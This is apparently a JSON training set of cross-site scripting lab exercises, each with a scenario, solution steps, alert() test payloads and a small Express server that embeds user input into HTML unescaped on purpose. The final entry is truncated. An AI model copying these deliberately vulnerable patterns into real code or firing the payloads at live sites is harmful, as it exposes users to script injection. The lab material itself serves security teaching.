[
  {
    "Lab scenario": "XSS via user badge label in gamified profile",
    "Lab Description": "Users can earn badges and customize their labels. These labels are rendered with innerHTML on the profile page. A crafted label can trigger XSS in the profile viewer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set badge label to <script>alert(1)</script>",
      "Visit profile page",
      "Script executes in badge display area"
    ],
    "payloads": [
      "<script>alert('badgeXSS')</script>",
      "<img src=x onerror=alert('badge')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet badge = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-badge', (req, res) => { badge = req.body.label; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><span>${badge}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via invoice comment in PDF viewer",
    "Lab Description": "Users can leave comments on invoices, which are rendered in a PDF-like preview using innerHTML. A malicious comment results in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment: <img src=x onerror=alert(1)>",
      "Open the invoice preview",
      "Script executes inside the rendered page"
    ],
    "payloads": [
      "<script>alert('invoiceXSS')</script>",
      "<img src=x onerror=alert('invoice')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { comment = req.body.text; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><div>${comment}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via poll answer option rendering",
    "Lab Description": "Poll creators can define custom answer options. These options are displayed as HTML radio buttons using innerHTML. A crafted option label causes XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create option label: <img src=x onerror=alert(1)>",
      "View the poll as a user",
      "Script executes immediately"
    ],
    "payloads": [
      "<script>alert('pollXSS')</script>",
      "<img src=x onerror=alert('option')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet options = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-option', (req, res) => { options.push(req.body.opt); res.redirect('/poll'); });\napp.get('/poll', (req, res) => { const html = options.map(o => `<label><input type='radio'>${o}</label>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via webhook response rendering",
    "Lab Description": "The admin dashboard logs webhook responses for debugging. If a webhook includes attacker-controlled content, it is rendered via innerHTML.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send webhook with payload in response: <script>alert(1)</script>",
      "Admin opens log viewer",
      "Script executes inside log panel"
    ],
    "payloads": [
      "<script>alert('webhookXSS')</script>",
      "<img src=x onerror=alert('webhook')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet log = '';\napp.use(express.text());\napp.post('/webhook', (req, res) => { log = req.body; res.send('OK'); });\napp.get('/admin/logs', (req, res) => { res.send(`<html><body><div>${log}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chatroom room name injection",
    "Lab Description": "Users can create chatrooms with custom names. Room names are rendered into the chat interface using innerHTML. A malicious name triggers XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create chatroom named <script>alert(1)</script>",
      "Open the chatroom interface",
      "Script executes in the title bar"
    ],
    "payloads": [
      "<script>alert('chatroomXSS')</script>",
      "<img src=x onerror=alert('room')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet roomName = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-room', (req, res) => { roomName = req.body.name; res.redirect('/room'); });\napp.get('/room', (req, res) => { res.send(`<html><body><h2>${roomName}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via transaction category labels in expense tracker",
    "Lab Description": "The financial tracker allows custom labels for spending categories. These are rendered using innerHTML in charts and summaries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create category: <img src=x onerror=alert(1)>",
      "View spending summary",
      "Payload triggers in label display"
    ],
    "payloads": [
      "<script>alert('financeXSS')</script>",
      "<img src=x onerror=alert('category')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet categories = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { categories.push(req.body.cat); res.redirect('/summary'); });\napp.get('/summary', (req, res) => { const html = categories.map(c => `<li>${c}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via delivery note comment on order receipt",
    "Lab Description": "The order confirmation page reflects delivery notes added by the customer. These are rendered with innerHTML and may trigger script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a note: <script>alert(1)</script>",
      "Load the receipt page",
      "Observe payload in delivery note section"
    ],
    "payloads": [
      "<script>alert('noteXSS')</script>",
      "<img src=x onerror=alert('delivery')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/checkout', (req, res) => { note = req.body.note; res.redirect('/receipt'); });\napp.get('/receipt', (req, res) => { res.send(`<html><body><p>Delivery Note: ${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via iframe-embedded error reporting message",
    "Lab Description": "A support widget displays error messages submitted via URL. These are injected into an iframe via srcdoc using user input.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft iframe srcdoc: <iframe srcdoc='<script>alert(1)</script>'>",
      "Load iframe in support chat widget",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('iframeXSS')</script>",
      "<img src=x onerror=alert('srcdoc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/support', (req, res) => {\n  const msg = req.query.msg || 'All good';\n  res.send(`<html><body><iframe srcdoc=\"${msg}\"></iframe></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via push notification content in preview mode",
    "Lab Description": "Admins can preview a push notification before sending. The content is injected into a simulation UI using innerHTML. XSS is possible via payloads in notification text.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set preview content: <script>alert(1)</script>",
      "Load notification preview interface",
      "Script executes in preview simulator"
    ],
    "payloads": [
      "<script>alert('pushXSS')</script>",
      "<img src=x onerror=alert('notify')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/preview-push', (req, res) => { msg = req.body.text; res.redirect('/push-ui'); });\napp.get('/push-ui', (req, res) => { res.send(`<html><body><div>${msg}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via leaderboard player alias",
    "Lab Description": "Player aliases are shown on leaderboards and profile pages. When displayed using innerHTML, a crafted alias can lead to script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set alias to <script>alert(1)</script>",
      "Visit leaderboard page",
      "Observe script execution in player slot"
    ],
    "payloads": [
      "<script>alert('aliasXSS')</script>",
      "<img src=x onerror=alert('alias')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/leaderboard'); });\napp.get('/leaderboard', (req, res) => { res.send(`<html><body><h3>${alias}</h3></body></html>`); });\napp.listen(3000);"
  },
 {
    "Lab scenario": "XSS via dynamic tab title in workspace manager",
    "Lab Description": "Each user workspace tab allows setting a custom title. The title is rendered in the UI using innerHTML. Injecting a script into the title triggers XSS upon switching tabs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a tab with title <script>alert(1)</script>",
      "Switch to that tab in the workspace view",
      "Script executes in the header"
    ],
    "payloads": [
      "<script>alert('tabTitleXSS')</script>",
      "<img src=x onerror=alert('tabTitle')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tabTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-tab', (req, res) => { tabTitle = req.body.title; res.redirect('/workspace'); });\napp.get('/workspace', (req, res) => { res.send(`<html><body><div class='tab'>${tabTitle}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via voice assistant command history log",
    "Lab Description": "The app logs all user-issued voice commands. These commands are displayed via innerHTML in a console view. Injecting HTML into a command triggers XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Issue a command like <img src=x onerror=alert(1)> via voice interface",
      "Open command history",
      "Payload executes inside the console"
    ],
    "payloads": [
      "<script>alert('voiceLogXSS')</script>",
      "<img src=x onerror=alert('voice')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet logs = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-command', (req, res) => { logs.push(req.body.cmd); res.redirect('/history'); });\napp.get('/history', (req, res) => { const html = logs.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via timeline entry in project journal",
    "Lab Description": "The journal logs project updates as timeline entries. Each entry is displayed using innerHTML. A crafted entry leads to script injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add journal entry: <script>alert(1)</script>",
      "Open the timeline view",
      "Payload executes immediately"
    ],
    "payloads": [
      "<script>alert('timelineLogXSS')</script>",
      "<img src=x onerror=alert('journal')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet timeline = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-entry', (req, res) => { timeline.push(req.body.entry); res.redirect('/timeline'); });\napp.get('/timeline', (req, res) => { const html = timeline.map(e => `<div>${e}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via search history tag cloud",
    "Lab Description": "The app builds a visual tag cloud from users' past search terms. Terms are rendered via innerHTML. Injected HTML in a search term executes code on render.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for <img src=x onerror=alert(1)>",
      "View the tag cloud",
      "Script executes immediately"
    ],
    "payloads": [
      "<img src=x onerror=alert('tagCloud')>",
      "<script>alert('searchTagXSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/search', (req, res) => { tags.push(req.body.query); res.redirect('/cloud'); });\napp.get('/cloud', (req, res) => { const html = tags.map(t => `<span>${t}</span>`).join(' '); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom error message in form validation override",
    "Lab Description": "Admins can define custom error messages for failed validations. These are rendered via innerHTML in form fields. Malicious input causes script execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set custom message to <script>alert(1)</script>",
      "Trigger validation failure",
      "Payload executes inside the error box"
    ],
    "payloads": [
      "<script>alert('formErrorXSS')</script>",
      "<img src=x onerror=alert('errorBox')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet errMsg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-error', (req, res) => { errMsg = req.body.msg; res.redirect('/form'); });\napp.get('/form', (req, res) => { res.send(`<html><body><form><input type='text'><div>${errMsg}</div></form></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via blog post tag rendering",
    "Lab Description": "The blog platform allows users to assign custom tags to posts. These tags are rendered using innerHTML. A malicious tag can trigger XSS when viewed on the blog post page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a tag with content: <img src=x onerror=alert(1)>",
      "Assign it to a post",
      "View the blog post and observe script execution"
    ],
    "payloads": [
      "<img src=x onerror=alert('tagXSS')>",
      "<script>alert('blog')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tags.push(req.body.tag); res.redirect('/post'); });\napp.get('/post', (req, res) => { const html = tags.map(t => `<span>${t}</span>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via RSS feed item title injection",
    "Lab Description": "The application displays titles from external RSS feeds. If an attacker controls a feed item title and it is rendered via innerHTML, XSS is possible.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Host RSS with <title><script>alert(1)</script></title>",
      "Add feed to dashboard",
      "Script executes when feed loads"
    ],
    "payloads": [
      "<script>alert('rssXSS')</script>",
      "<img src=x onerror=alert('rss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet feedTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/import-feed', (req, res) => { feedTitle = req.body.title; res.redirect('/feeds'); });\napp.get('/feeds', (req, res) => { res.send(`<html><body><h2>${feedTitle}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic avatar tooltip description",
    "Lab Description": "The app shows a tooltip with user bio when hovering over avatars. Bios are inserted into the tooltip container using innerHTML. A malicious bio can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set your bio to <img src=x onerror=alert(1)>",
      "Hover over your avatar",
      "Observe script execution in tooltip"
    ],
    "payloads": [
      "<img src=x onerror=alert('tooltipXSS')>",
      "<script>alert('bio')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet bio = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-bio', (req, res) => { bio = req.body.bio; res.redirect('/avatar'); });\napp.get('/avatar', (req, res) => { res.send(`<html><body><div title='${bio}'><img src='avatar.png'></div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via autocomplete address suggestions",
    "Lab Description": "The checkout form provides address suggestions based on previous inputs. These are rendered using innerHTML in a datalist. A malicious address triggers XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit address: <img src=x onerror=alert(1)>",
      "Reopen the form to see suggestions",
      "Payload executes in datalist"
    ],
    "payloads": [
      "<script>alert('addressXSS')</script>",
      "<img src=x onerror=alert('auto')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet addresses = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/save-address', (req, res) => { addresses.push(req.body.addr); res.redirect('/checkout'); });\napp.get('/checkout', (req, res) => { const html = addresses.map(a => `<option>${a}</option>`).join(''); res.send(`<html><body><input list='addresses'><datalist id='addresses'>${html}</datalist></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via forum thread subject preview",
    "Lab Description": "The forum displays a preview of the latest thread titles. These are injected into the page using innerHTML. A malicious subject line can trigger XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a thread titled: <script>alert(1)</script>",
      "Visit homepage with thread previews",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('threadXSS')</script>",
      "<img src=x onerror=alert('subject')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet threads = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/new-thread', (req, res) => { threads.push(req.body.subject); res.redirect('/'); });\napp.get('/', (req, res) => { const html = threads.map(t => `<div>${t}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via product review headline",
    "Lab Description": "Users can submit reviews with headlines. These headlines are shown on product pages using innerHTML. A malicious headline can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit headline: <script>alert(1)</script>",
      "Visit product page",
      "Payload executes in review section"
    ],
    "payloads": [
      "<script>alert('reviewXSS')</script>",
      "<img src=x onerror=alert('review')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reviews = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/review', (req, res) => { reviews.push(req.body.headline); res.redirect('/product'); });\napp.get('/product', (req, res) => { const html = reviews.map(r => `<h4>${r}</h4>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via interactive onboarding tip content",
    "Lab Description": "The onboarding tutorial system displays tips from server-configured content. These tips are rendered into a floating box using innerHTML. If a tip is compromised, XSS is possible.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit onboarding tip as <img src=x onerror=alert(1)>",
      "Trigger onboarding walkthrough",
      "Observe payload execution"
    ],
    "payloads": [
      "<img src=x onerror=alert('tipXSS')>",
      "<script>alert('onboarding')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tip = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-tip', (req, res) => { tip = req.body.tip; res.redirect('/onboard'); });\napp.get('/onboard', (req, res) => { res.send(`<html><body><div class='tip'>${tip}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via invoice line-item notes",
    "Lab Description": "Line items in invoices can have custom notes. These are rendered with innerHTML in the invoice breakdown. A malicious note results in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add line-item note: <script>alert(1)</script>",
      "Generate invoice",
      "Observe script execution in invoice view"
    ],
    "payloads": [
      "<script>alert('lineXSS')</script>",
      "<img src=x onerror=alert('line')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-line', (req, res) => { notes.push(req.body.note); res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { const html = notes.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via project status field in kanban board",
    "Lab Description": "Kanban cards include editable status fields. These values are rendered with innerHTML. A crafted status text allows XSS injection in the task board.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set status to <script>alert(1)</script>",
      "Open the kanban board",
      "Script executes in task card"
    ],
    "payloads": [
      "<script>alert('kanbanXSS')</script>",
      "<img src=x onerror=alert('board')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet statuses = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-status', (req, res) => { statuses.push(req.body.status); res.redirect('/board'); });\napp.get('/board', (req, res) => { const html = statuses.map(s => `<div class='card'>${s}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via calendar event description popup",
    "Lab Description": "Calendar events show descriptions in a popup when clicked. If the description is rendered using innerHTML, a crafted value can lead to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create event with description: <img src=x onerror=alert(1)>",
      "Click the event on the calendar",
      "Observe payload execution in popup"
    ],
    "payloads": [
      "<img src=x onerror=alert('eventXSS')>",
      "<script>alert('calendar')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/event', (req, res) => { desc = req.body.desc; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div onclick=\"alert('${desc}')\">Event</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic FAQ answer content",
    "Lab Description": "The FAQ section allows administrators to write answers in rich text. These answers are rendered using innerHTML. A malicious answer content leads to stored XSS when a user visits the FAQ page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an answer with: <script>alert('faq')</script>",
      "Visit the FAQ viewer page",
      "Observe script execution in the answer section"
    ],
    "payloads": [
      "<script>alert('faqXSS')</script>",
      "<img src=x onerror=alert('faq')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet answer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-answer', (req, res) => { answer = req.body.answer; res.redirect('/faq'); });\napp.get('/faq', (req, res) => { res.send(`<html><body><div>${answer}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via job application cover letter preview",
    "Lab Description": "Applicants can enter a cover letter that’s previewed before submission. If the content is injected using innerHTML, XSS can occur.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter a cover letter with: <script>alert('cover')</script>",
      "Click preview button",
      "Observe execution in the preview window"
    ],
    "payloads": [
      "<script>alert('coverXSS')</script>",
      "<img src=x onerror=alert('cover')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet letter = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-cover', (req, res) => { letter = req.body.text; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><div>${letter}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via editable survey question title",
    "Lab Description": "Admins can add and edit survey questions. The titles are rendered directly into the page. A crafted title allows stored XSS execution when the survey is loaded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a question with: <img src=x onerror=alert(1)>",
      "Open the survey as user",
      "Observe payload execution in title area"
    ],
    "payloads": [
      "<script>alert('surveyTitleXSS')</script>",
      "<img src=x onerror=alert('question')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/question', (req, res) => { title = req.body.title; res.redirect('/survey'); });\napp.get('/survey', (req, res) => { res.send(`<html><body><h3>${title}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via live chat username rendering",
    "Lab Description": "In the live chat system, usernames are rendered with innerHTML when they join the chat. An attacker can inject script via the username.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Join chat with username: <script>alert(1)</script>",
      "Wait for message display",
      "Script executes in chat stream"
    ],
    "payloads": [
      "<script>alert('chatXSS')</script>",
      "<img src=x onerror=alert('livechat')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet users = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/join', (req, res) => { users.push(req.body.name); res.redirect('/chat'); });\napp.get('/chat', (req, res) => { const html = users.map(u => `<p>${u} joined</p>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via file upload success message",
    "Lab Description": "When users upload files, the file name is reflected back in the success message. If rendered unsanitized, this can result in reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload file with name: <script>alert(1)</script>",
      "Observe the confirmation",
      "Script executes"
    ],
    "payloads": [
      "<script>alert('uploadXSS')</script>",
      "<img src=x onerror=alert('file')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet file = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => { file = req.body.name; res.redirect('/done'); });\napp.get('/done', (req, res) => { res.send(`<html><body><p>Uploaded: ${file}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via app notification message rendering",
    "Lab Description": "System-generated notifications may include user-generated content such as names or messages. These are displayed using innerHTML, leading to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger a system notification with attacker content",
      "Visit notification center",
      "Observe XSS execution"
    ],
    "payloads": [
      "<script>alert('notificationXSS')</script>",
      "<img src=x onerror=alert('notif')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet notif = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/trigger-notif', (req, res) => { notif = req.body.text; res.redirect('/notifications'); });\napp.get('/notifications', (req, res) => { res.send(`<html><body><div>${notif}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via contest entry title",
    "Lab Description": "Users can submit creative titles for a contest. These are rendered for public voting using innerHTML. Malicious entries lead to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit entry titled <script>alert(1)</script>",
      "Open public voting page",
      "Script executes in title area"
    ],
    "payloads": [
      "<script>alert('contestXSS')</script>",
      "<img src=x onerror=alert('entry')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet entries = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-entry', (req, res) => { entries.push(req.body.title); res.redirect('/vote'); });\napp.get('/vote', (req, res) => { const html = entries.map(e => `<h2>${e}</h2>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic welcome banner",
    "Lab Description": "The homepage shows a personalized welcome message using the user's name. If the name is rendered unsanitized, reflected XSS is possible.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /?name=<script>alert(1)</script>",
      "Observe the greeting",
      "Script executes on page load"
    ],
    "payloads": [
      "<script>alert('welcomeXSS')</script>",
      "<img src=x onerror=alert('banner')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n  const name = req.query.name || 'Guest';\n  res.send(`<html><body><h1>Welcome ${name}</h1></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via email template custom footer",
    "Lab Description": "Marketing users can set a footer message in the email builder. If rendered in the preview or final email without escaping, stored XSS is possible.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add footer: <img src=x onerror=alert(1)>",
      "Open email preview",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('emailXSS')</script>",
      "<img src=x onerror=alert('footer')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet footer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-footer', (req, res) => { footer = req.body.footer; res.redirect('/email'); });\napp.get('/email', (req, res) => { res.send(`<html><body><div>${footer}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via group chat topic title",
    "Lab Description": "Group chats allow setting a topic. The topic is rendered on top of the chatroom using innerHTML. XSS can occur if the title is unsanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set topic: <script>alert(1)</script>",
      "Join chatroom",
      "Observe XSS on load"
    ],
    "payloads": [
      "<script>alert('topicXSS')</script>",
      "<img src=x onerror=alert('topic')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-topic', (req, res) => { topic = req.body.topic; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><h2>${topic}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom 404 error message rendering",
    "Lab Description": "The application allows admins to configure custom 404 error messages. If the message is rendered using innerHTML, attackers can inject a script.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set 404 message to <script>alert('404')</script>",
      "Trigger a 404 by visiting a non-existent page",
      "Observe payload execution in the error screen"
    ],
    "payloads": [
      "<script>alert('custom404XSS')</script>",
      "<img src=x onerror=alert('404')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet message = 'Page not found';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-404', (req, res) => { message = req.body.msg; res.redirect('/'); });\napp.use((req, res) => { res.status(404).send(`<html><body><h1>${message}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via poll results graph labels",
    "Lab Description": "Poll results are shown using a bar graph. Each bar has a label sourced from user-submitted answers. If labels are rendered using innerHTML, XSS is possible.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a poll answer: <img src=x onerror=alert(1)>",
      "View poll results graph",
      "Script executes in graph label"
    ],
    "payloads": [
      "<script>alert('pollGraphXSS')</script>",
      "<img src=x onerror=alert('poll')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet answers = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/vote', (req, res) => { answers.push(req.body.option); res.redirect('/results'); });\napp.get('/results', (req, res) => { const html = answers.map(a => `<div class='bar'>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via profile 'about me' HTML bio field",
    "Lab Description": "The profile page includes an 'about me' field which supports limited HTML. If not sanitized properly, a malicious script can be stored and executed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set bio to <script>alert('bio')</script>",
      "Visit the profile page",
      "Script executes in bio section"
    ],
    "payloads": [
      "<script>alert('bioXSS')</script>",
      "<img src=x onerror=alert('about')>"
    ],
    "Vulnerability name": "Cross-site scripting",
